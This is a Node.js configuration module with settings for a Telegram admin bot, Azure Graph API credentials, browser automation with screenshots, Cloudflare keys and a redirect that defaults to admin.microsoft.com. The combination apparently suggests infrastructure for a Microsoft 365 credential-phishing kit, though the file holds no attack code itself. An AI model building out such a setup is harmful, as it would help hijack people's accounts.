const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

class Config {
    constructor() {
        // Load environment variables from .env file if it exists
        this.loadEnvFile();
        
        // Initialize all configuration
        this.server = this.initServerConfig();
        this.security = this.initSecurityConfig();
        this.services = this.initServicesConfig();
        this.automation = this.initAutomationConfig();
        this.cloudflare = this.loadCloudflareConfig();
        this.redirect = this.loadRedirectConfig();
        
        // Validate critical configurations
        this.validate();
    }

    // Load .env file if it exists
    loadEnvFile() {
        const envPath = path.join(process.cwd(), '.env');
        if (fs.existsSync(envPath)) {
            const envFile = fs.readFileSync(envPath, 'utf8');
            envFile.split('\n').forEach(line => {
                // Skip comments and empty lines
                if (line.trim().startsWith('#') || !line.trim()) return;

                const [key, ...valueParts] = line.split('=');
                const value = valueParts.join('='); // Handle values with = in them

                if (key && value && !process.env[key]) {
                    process.env[key] = value.trim();
                }
            });
            console.log('✅ Environment variables loaded from .env file');
        }
    }

    // Server configuration
    initServerConfig() {
        return {
            port: parseInt(process.env.PORT) || 5000, // Fixed port for Replit
            nodeEnv: process.env.NODE_ENV || 'development',
            cors: {
                origin: true, // Allow all origins for Replit proxy
                credentials: true
            }
        };
    }

    // Security configuration
    initSecurityConfig() {
        return {
            adminToken: this.generateAdminToken(),
            encryptionSeed: process.env.ENCRYPTION_SEED || this.generateEncryptionSeed(),
            sessionTimeout: 30 * 60 * 1000, // 30 minutes
        };
    }

    // Services configuration (external APIs)
    initServicesConfig() {
        return {
            telegram: {
                botToken: process.env.TELEGRAM_BOT_TOKEN,
                adminChatIds: process.env.ADMIN_CHAT_IDS ? 
                    process.env.ADMIN_CHAT_IDS.split(',').map(id => id.trim()) : []
            },
            azure: {
                clientId: process.env.AZURE_CLIENT_ID,
                clientSecret: process.env.AZURE_CLIENT_SECRET,
                tenantId: process.env.AZURE_TENANT_ID,
                redirectUri: process.env.AZURE_REDIRECT_URI || '/api/auth-callback'
            }
        };
    }

    // Browser automation configuration
    initAutomationConfig() {
        return {
            maxPreloads: 2,
            maxWarmBrowsers: 0, // Disabled for optimization
            minWarmBrowsers: 0, // Disabled for optimization
            screenshotQuality: 80,
            enableScreenshots: true
        };
    }

    // Generate secure admin token
    generateAdminToken() {
        return 'admin-' + crypto.randomBytes(12).toString('hex');
    }

    // Generate encryption seed
    generateEncryptionSeed() {
        const seedFile = path.join(process.cwd(), '.encryption-seed');
        
        if (fs.existsSync(seedFile)) {
            try {
                const existingSeed = fs.readFileSync(seedFile, 'utf8').trim();
                if (existingSeed && existingSeed.length >= 32) {
                    console.log('🔐 Using existing encryption seed from file');
                    return existingSeed;
                }
            } catch (error) {
                console.warn('⚠️ Error reading existing seed file:', error.message);
            }
        }
        
        // Generate new secure seed
        const newSeed = crypto.randomBytes(32).toString('hex');
        
        try {
            fs.writeFileSync(seedFile, newSeed, 'utf8');
            console.log('🔑 Generated new encryption seed and saved to file');
        } catch (error) {
            console.warn('⚠️ Could not save seed to file:', error.message);
        }
        
        return newSeed;
    }

    // Load Cloudflare configuration
    loadCloudflareConfig() {
        const configFile = path.join(process.cwd(), 'cloudflare-config.json');
        const defaultConfig = {
            zoneId: null,
            apiKey: null,
            email: null,
            configured: false
        };

        if (fs.existsSync(configFile)) {
            try {
                const savedConfig = JSON.parse(fs.readFileSync(configFile, 'utf8'));
                const config = { ...defaultConfig, ...savedConfig };
                
                if (config.configured) {
                    console.log('🌤️ Cloudflare configuration loaded from file');
                    if (config.apiKey) {
                        console.log('✅ Global API Key authentication configured');
                    }
                }
                
                return config;
            } catch (error) {
                console.warn('⚠️ Error loading Cloudflare config:', error.message);
            }
        }

        return defaultConfig;
    }

    // Load redirect configuration
    loadRedirectConfig() {
        const configFile = path.join(process.cwd(), 'redirect-config.json');
        const defaultConfig = {
            redirectUrl: 'https://admin.microsoft.com',
            lastUpdated: null
        };

        if (fs.existsSync(configFile)) {
            try {
                const savedConfig = JSON.parse(fs.readFileSync(configFile, 'utf8'));
                return { ...defaultConfig, ...savedConfig };
            } catch (error) {
                console.warn('⚠️ Error loading redirect config:', error.message);
            }
        }

        return defaultConfig;
    }

    // Save Cloudflare configuration
    saveCloudflareConfig(config) {
        const configFile = path.join(process.cwd(), 'cloudflare-config.json');
        try {
            this.cloudflare = { ...this.cloudflare, ...config };
            fs.writeFileSync(configFile, JSON.stringify(this.cloudflare, null, 2));
            console.log('🌤️ Cloudflare configuration saved successfully');
            return true;
        } catch (error) {
            console.error('❌ Error saving Cloudflare config:', error.message);
            return false;
        }
    }

    // Save redirect configuration
    saveRedirectConfig(redirectUrl) {
        const configFile = path.join(process.cwd(), 'redirect-config.json');
        try {
            this.redirect = {
                redirectUrl: redirectUrl,
                lastUpdated: new Date().toISOString()
            };
            fs.writeFileSync(configFile, JSON.stringify(this.redirect, null, 2));
            console.log('📝 Redirect configuration saved successfully');
            return true;
        } catch (error) {
            console.error('❌ Error saving redirect config:', error.message);
            return false;
        }
    }

    // Validate critical configuration
    validate() {
        const warnings = [];
        
        if (!this.services.telegram.botToken) {
            warnings.push('TELEGRAM_BOT_TOKEN not configured - Telegram notifications disabled');
        }
        
        if (!this.services.azure.clientId || !this.services.azure.clientSecret || !this.services.azure.tenantId) {
            warnings.push('Azure configuration incomplete - Graph API functionality may be limited');
        }
        
        warnings.forEach(warning => {
            console.log(`⚠️ ${warning}`);
        });
        
        console.log('✅ Configuration initialized successfully');
    }

    // Get configuration section
    get(section) {
        return this[section];
    }

    // Get full configuration
    getAll() {
        return {
            server: this.server,
            security: this.security,
            services: this.services,
            automation: this.automation,
            cloudflare: this.cloudflare,
            redirect: this.redirect
        };
    }
}

// Export singleton instance
module.exports = new Config();